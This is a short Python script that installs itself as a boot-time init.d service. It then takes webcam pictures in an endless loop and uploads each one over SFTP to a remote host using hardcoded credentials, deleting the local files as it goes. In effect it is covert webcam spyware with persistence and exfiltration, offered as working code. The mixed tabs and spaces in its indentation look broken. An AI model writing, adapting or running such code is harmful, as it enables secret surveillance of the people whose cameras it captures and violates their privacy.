#!/usr/bin/python
# -*- coding: cp1254 -*-
'''
Created on 26 Haz 2013
@author: onuragtas
'''
from cv2 import *
import os, paramiko, sys
pyname = sys.argv[0]
sh = """#!/bin/bash
python /usr/bin/"""+pyname+"""
exit 0"""
open("sshp.sh", "w").write(sh)
os.system("sudo -S cp "+pyname+" /usr/bin/"+pyname+" && sudo -S mv sshp.sh /etc/init.d/sshp.sh && sudo -S chmod +x /etc/init.d/sshp.sh && sudo -S update-rc.d sshp.sh defaults")
host = "ip"
user="user"
password = "onuragtas100"
port=22
i=0
transport = paramiko.Transport((host, port))
transport.connect(username = user, password = password)
sftp = paramiko.SFTPClient.from_transport(transport)    
while(True):
	cam = VideoCapture(0)   # 0 -> index of camera
    	s, img = cam.read()
        if s:    # frame captured without any errors
	    
	    imwrite("filename"+str(i)+".jpg",img) #save image
	    filepath = 'filename'+str(i)+'.jpg'
	    localpath = '/home/onuragtas/pyCam/resim'+str(i)+'.jpg'
	    sftp.put(filepath, localpath)
	    os.system("rm -R filename"+str(i)+".jpg")
	    i=i+1	   
sftp.close()
transport.close()